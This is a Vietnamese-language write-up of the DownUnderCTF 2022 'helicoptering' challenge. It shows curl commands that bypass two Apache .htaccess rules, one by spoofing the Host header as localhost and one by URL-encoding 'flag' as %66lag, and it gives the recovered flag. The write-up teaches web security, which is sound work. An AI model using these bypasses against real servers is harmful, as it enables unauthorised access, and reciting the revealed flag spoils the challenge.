# WRITE-UP  DownUnderCTF 2022 -  helicoptering 

Sau khi sữ dụng lệnh curl -I http://yourdomain.com ta nhận được:

HTTP/1.1 403 Forbidden

Date: Tue, 15 Apr 2025 08:44:43 GMT

Server: Apache/2.4.54 (Debian)

Content-Type: text/html; charset=iso-8859-1

Bạn thấy một mã trạng thái 403 hoặc một số thông báo khác cho thấy bị từ chối quyền truy cập, có thể đó là vì quy tắc .htaccess chặn truy cập.

# Ở file one/.htaccess ta thấy rằng nếu Host không phải là localhost, yêu cầu sẽ bị từ chối ngay lập tức với mã trạng thái 403 Forbidden (thông qua dòng RewriteRule ".*" "-" [F])
RewriteEngine On
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]

Vì vậy thiết lập header Host trong yêu cầu HTTP thành localhost.

curl -i -s -k -X $'GET' -H $'Host: localhost' $'http://192.168.93.128:30026/one/flag.txt'

HTTP/1.1 200 OK
Date: Tue, 15 Apr 2025 09:02:00 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Tue, 15 Apr 2025 06:34:43 GMT
ETag: "10-632cb5d2eec3c"
Accept-Ranges: bytes
Content-Length: 16
Content-Type: text/plain

DUCTF{thats_it_



# Ở file two/.htaccess ta thấy kiểm tra biến server THE_REQUEST, chứa toàn bộ dòng yêu cầu HTTP (ví dụ: GET /index.html HTTP/1.1). 
Điều quan trọng là quy tắc tìm kiếm sự xuất hiện của chuỗi flag trong dòng yêu cầu. Nếu tìm thấy flag, yêu cầu sẽ bị chặn (qua RewriteRule).
RewriteEngine On
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]

Vì vậy chúng ta cần đảm bảo rằng chuỗi flag không xuất hiện trong dòng yêu cầu. 
Nên mã hóa URL chuỗi flag, vì quy tắc .htaccess chỉ kiểm tra chuỗi flag chưa được mã hóa.
Chuỗi mã hóa URL của từ flag là %66lag

curl http://192.168.93.128:30026/two/%66lag.txt
next_time_im_using_nginx}
